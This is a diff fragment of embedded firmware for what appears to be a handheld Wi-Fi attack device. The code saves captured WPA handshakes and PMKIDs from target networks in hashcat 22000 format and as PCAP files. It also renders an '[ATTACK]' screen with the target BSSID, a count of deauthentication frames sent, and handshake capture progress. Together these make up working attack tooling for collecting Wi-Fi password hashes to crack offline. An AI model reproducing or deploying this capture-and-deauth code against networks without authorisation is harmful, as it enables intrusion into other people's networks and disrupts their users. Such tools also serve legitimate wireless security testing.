+    if (nonceFrame->len < 51 || eapolFrame->len < 97) return false;
+    
+    File f = SD.open(path, FILE_WRITE);
+    if (!f) return false;
+    
+    // MIC from M2 (offset 81, 16 bytes)
+    char micHex[33];
+    for (int i = 0; i < 16; i++) sprintf(micHex + i*2, "%02x", eapolFrame->data[81 + i]);
+    
+    char macAP[13];
+    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
+            hs.bssid[0], hs.bssid[1], hs.bssid[2],
+            hs.bssid[3], hs.bssid[4], hs.bssid[5]);
+    
+    char macClient[13];
+    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
+            hs.station[0], hs.station[1], hs.station[2],
+            hs.station[3], hs.station[4], hs.station[5]);
+    
+    char essidHex[65];
+    int ssidLen = strlen(hs.ssid);
+    if (ssidLen > 32) ssidLen = 32;
+    for (int i = 0; i < ssidLen; i++) sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
+    essidHex[ssidLen * 2] = 0;
+    
+    // ANonce from M1 or M3 (offset 17, 32 bytes)
+    char nonceHex[65];
+    for (int i = 0; i < 32; i++) sprintf(nonceHex + i*2, "%02x", nonceFrame->data[17 + i]);
+    
+    // Full EAPOL from M2 (hex-encoded, MIC zeroed)
+    uint16_t eapolLen = (eapolFrame->data[2] << 8) | eapolFrame->data[3];
+    eapolLen += 4;
+    if (eapolLen > eapolFrame->len) eapolLen = eapolFrame->len;
+    
+    static char eapolHex[513];  // 256 bytes * 2 + null (fits our 128-byte cap)
+    if (eapolLen * 2 + 1 > sizeof(eapolHex)) { f.close(); return false; }
+    
+    uint8_t eapolCopy[128];
+    uint16_t copyLen = (eapolLen < 128) ? eapolLen : 128;
+    memcpy(eapolCopy, eapolFrame->data, copyLen);
+    if (copyLen > 81) memset(eapolCopy + 81, 0, min((uint16_t)16, (uint16_t)(copyLen - 81)));
+    
+    for (uint16_t i = 0; i < copyLen; i++) sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
+    eapolHex[copyLen * 2] = 0;
+    
+    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
+             micHex, macAP, macClient, essidHex, nonceHex, eapolHex, msgPair);
+    f.close();
+    return true;
+}
+
+void SpectrumMode::autoSaveCaptures() {
+    if (!Config::isSDAvailable()) return;
+    
+    bool anySaved = false;
+    
+    // Pause promiscuous for safe SD access
+    bool pausedByUs = false;
+    if (NetworkRecon::isRunning()) {
+        NetworkRecon::pause();
+        pausedByUs = true;
+    }
+    delay(5);
+    
+    const char* handshakesDir = SDLayout::handshakesDir();
+    if (!SD.exists(handshakesDir)) {
+        SD.mkdir(handshakesDir);
+    }
+    
+    // Save PMKIDs
+    for (uint8_t i = 0; i < capturedPMKIDCount; i++) {
+        SpectrumPMKID& p = capturedPMKIDs[i];
+        if (p.saved) continue;
+        
+        // Reject all-zero PMKIDs
+        bool allZeros = true;
+        for (int j = 0; j < 16; j++) if (p.pmkid[j] != 0) { allZeros = false; break; }
+        if (allZeros || p.ssid[0] == 0) { p.saved = true; continue; }
+        
+        char filename[64];
+        SDLayout::buildCaptureFilename(filename, sizeof(filename),
+                                       handshakesDir, p.ssid, p.bssid, "_pmkid.22000");
+        
+        char pmkidHex[33];
+        for (int j = 0; j < 16; j++) sprintf(pmkidHex + j*2, "%02x", p.pmkid[j]);
+        char macAP[13];
+        sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
+                p.bssid[0], p.bssid[1], p.bssid[2], p.bssid[3], p.bssid[4], p.bssid[5]);
+        char macClient[13];
+        sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
+                p.station[0], p.station[1], p.station[2], p.station[3], p.station[4], p.station[5]);
+        char essidHex[65];
+        int ssidLen = strlen(p.ssid);
+        if (ssidLen > 32) ssidLen = 32;
+        for (int j = 0; j < ssidLen; j++) sprintf(essidHex + j*2, "%02x", (uint8_t)p.ssid[j]);
+        essidHex[ssidLen * 2] = 0;
+        
+        File f = SD.open(filename, FILE_WRITE);
+        if (f) {
+            f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
+            f.close();
+            p.saved = true;
+            anySaved = true;
+            SDLog::log("SPECTRUM", "PMKID saved: %s", filename);
+            Serial.printf("[SPECTRUM] PMKID saved: %s\r\n", filename);
+        } else {
+            p.saveAttempts++;
+            if (p.saveAttempts >= 3) p.saved = true;  // Give up
+        }
+        delay(1);
+    }
+    
+    // Save handshakes (PCAP + hashcat 22000)
+    for (uint8_t i = 0; i < capturedHandshakeCount; i++) {
+        SpectrumCapturedHandshake& hs = capturedHandshakes[i];
+        if (!hs.isComplete() || hs.saved) continue;
+        if (hs.saveAttempts >= 3) { hs.saved = true; continue; }
+        
+        // Save PCAP
+        char pcapFile[64];
+        SDLayout::buildCaptureFilename(pcapFile, sizeof(pcapFile),
+                                       handshakesDir, hs.ssid, hs.bssid, ".pcap");
+        bool pcapOk = saveHandshakePCAP(hs, pcapFile);
+        
+        // Save hashcat 22000
+        char hs22kFile[64];
+        SDLayout::buildCaptureFilename(hs22kFile, sizeof(hs22kFile),
+                                       handshakesDir, hs.ssid, hs.bssid, "_hs.22000");
+        bool hs22kOk = saveHandshake22000(hs, hs22kFile);
+        
+        if (pcapOk || hs22kOk) {
+            hs.saved = true;
+            anySaved = true;
+            SDLog::log("SPECTRUM", "Handshake saved: %s (pcap:%s 22k:%s)",
+                       hs.ssid, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
+            Serial.printf("[SPECTRUM] Handshake saved: %s\r\n", hs.ssid);
+        } else {
+            hs.saveAttempts++;
+            if (hs.saveAttempts >= 3) hs.saved = true;
+        }
+        delay(1);
+    }
+    
+    if (pausedByUs) {
+        NetworkRecon::resume();
+    }
+    
+    if (anySaved) {
+        Display::showToast("CAPTURES SAVED");
+    }
+}
+
+void SpectrumMode::drawAttackOverlay(DisplayCanvas& canvas) {
+    canvas.fillSprite(COLOR_BG);
+
+    // Header
+    canvas.setTextSize(1);
+    canvas.setTextColor(COLOR_FG);
+    canvas.setTextDatum(top_left);
+    canvas.drawString("[ATTACK]", 4, 2);
+
+    // Target BSSID + channel
+    char bssidStr[18];
+    snprintf(bssidStr, sizeof(bssidStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+             attackBSSID[0], attackBSSID[1], attackBSSID[2],
+             attackBSSID[3], attackBSSID[4], attackBSSID[5]);
+    canvas.drawString(bssidStr, 4, 14);
+    char chStr[8];
+    snprintf(chStr, sizeof(chStr), "CH:%d", attackChannel);
+    canvas.drawString(chStr, 200, 14);
+
+    // Target SSID
+    if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
+        canvas.drawString(networks[monitoredNetworkIndex].ssid, 4, 24);
+    }
+
+    // Elapsed + deauth count
+    uint32_t elapsed = (millis() - attackStartTime) / 1000;
+    char timeStr[16];
+    snprintf(timeStr, sizeof(timeStr), "%lu:%02lu", elapsed / 60, elapsed % 60);
+    canvas.drawString(timeStr, 4, 36);
+    char deauthStr[24];
+    snprintf(deauthStr, sizeof(deauthStr), "DEAUTH:%lu", deauthCount);
+    canvas.drawString(deauthStr, 100, 36);
+
+    // Beacon status
+    canvas.drawString(attackBeaconCaptured ? "BCN:OK" : "BCN:...", 240, 36);
+
+    // PMKID status
+    char pmkidStr[20];
+    snprintf(pmkidStr, sizeof(pmkidStr), "PMKID:%d/4", capturedPMKIDCount);
+    canvas.drawString(pmkidStr, 4, 48);
+
+    // Handshake status
+    uint8_t hsComplete = 0;
+    for (uint8_t i = 0; i < capturedHandshakeCount; i++) {
+        if (capturedHandshakes[i].isComplete()) hsComplete++;
+    }
+    char hsStr[24];
+    snprintf(hsStr, sizeof(hsStr), "HS:%d/%d", hsComplete, SPECTRUM_HS_MAX);
+    canvas.drawString(hsStr, 120, 48);
+
+    // Show handshake details (mask)
+    uint8_t yOff = 62;
+    for (uint8_t i = 0; i < capturedHandshakeCount; i++) {
+        const SpectrumCapturedHandshake& hs = capturedHandshakes[i];
+        char detail[48];
+        char mask[5] = "----";
+        if (hs.hasM1()) mask[0] = '1';
+        if (hs.hasM2()) mask[1] = '2';
+        if (hs.hasM3()) mask[2] = '3';
+        if (hs.hasM4()) mask[3] = '4';
+        snprintf(detail, sizeof(detail), "HS%d:[%s] %s",
+                 i + 1, mask,
+                 hs.saved ? "SAVED" : (hs.isComplete() ? "GOT IT" : "WAIT..."));
+        canvas.drawString(detail, 4, yOff);
+        yOff += 12;
+    }
+
+    // Show PMKID list
+    for (uint8_t i = 0; i < capturedPMKIDCount && yOff < 130; i++) {
+        const SpectrumPMKID& p = capturedPMKIDs[i];
+        char entry[48];
+        snprintf(entry, sizeof(entry), "PMK%d: %s %s",
+                 i + 1, p.ssid, p.saved ? "[OK]" : "[..]");
+        canvas.drawString(entry, 4, yOff);
+        yOff += 12;
+    }
+
+    // Bottom hint
+    canvas.setTextDatum(bottom_left);
+    canvas.drawString("ESC/LEFT: EXIT", 4, 168);
+}
+
+void SpectrumMode::stop() {
+    if (!running) return;
+    
+    // Block callback during shutdown sequence
+    busy = true;
+    
+    // Exit attack mode if active
+    if (attackMode) {
+        exitAttackMode();
+    }
+
+    // Clear our packet callback (NetworkRecon keeps running)
+    NetworkRecon::setPacketCallback(nullptr);
+    
+    // [P4] Ensure monitoring is disabled
+    monitoringNetwork = false;
+    
+    // Unlock channel if we locked it
+    if (NetworkRecon::isChannelLocked()) {
+        NetworkRecon::unlockChannel();
+    }
+
+    // Clear spectrum-specific sweep override
+    NetworkRecon::clearHopIntervalOverride();
+    
+    running = false;
+    Display::setWiFiStatus(false);
+    
+    // FIX: Release vector capacity to recover heap
+    networks.clear();
+    networks.shrink_to_fit();
+    renderCount = 0;
+    memset(renderNets, 0, sizeof(renderNets));
+    memset(&renderSelected, 0, sizeof(renderSelected));
+    memset(&renderMonitor, 0, sizeof(renderMonitor));
+    
+    busy = false;
+    Serial.println("[SPECTRUM] Stopped - heap recovered");
 }
